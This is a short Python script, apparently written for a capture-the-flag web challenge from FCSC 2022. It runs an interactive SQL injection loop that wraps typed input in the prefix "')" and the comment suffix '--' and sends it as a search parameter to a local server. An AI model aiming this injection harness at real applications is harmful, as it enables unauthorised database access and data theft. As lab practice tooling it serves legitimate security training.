# Automated SQL injectio
import urllib.parse

import bs4
import requests

URL = "http://localhost:8000"

# PAYLOAD INFO
PAYLOAD_PREFIX = "')"
PAYLOAD_SUFFIX = "--"


def inject(payload: str) -> str:
    encoded = urllib.parse.quote(payload)
    url = f"{URL}/?search={encoded}"

    try:
        r = requests.get(url)
        print(f"showing preview for {url}")
        return clean(r.text[:1000])
    except Exception as e:
        return f"Error: {e}"


def build_payload(payload: str) -> str:
    return f"{PAYLOAD_PREFIX} {payload} {PAYLOAD_SUFFIX}"


def clean(html):
    soup = bs4.BeautifulSoup(html, "html.parser")
    return soup.get_text()


def main():
    print("https://hackropole.fr/fr/challenges/web/fcsc2022-web-chatpristi-2/")

    while True:
        payload = input("sqli> ")

        if payload.lower() == "exit":
            break

        res = inject(build_payload(payload))
        print(res)


main()
